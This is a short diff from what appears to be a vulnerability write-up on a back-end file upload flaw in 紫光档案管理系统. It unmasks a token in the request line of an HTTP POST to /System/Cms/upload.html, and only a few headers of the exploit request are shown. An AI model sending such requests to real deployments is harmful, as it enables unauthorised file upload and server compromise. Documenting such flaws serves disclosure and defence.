@@ -72,7 +72,7 @@ app="紫光档案管理系统"
 ![image-20230314084534337](./.resource/紫光档案管理系统-upload.html-后台文件上传漏洞/media/image-20230314084534337.png)
 
 ```http
-POST /System/Cms/upload.html?token=5*********************************1 HTTP/1.1
+POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
 Host: 
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Encoding: gzip, deflate
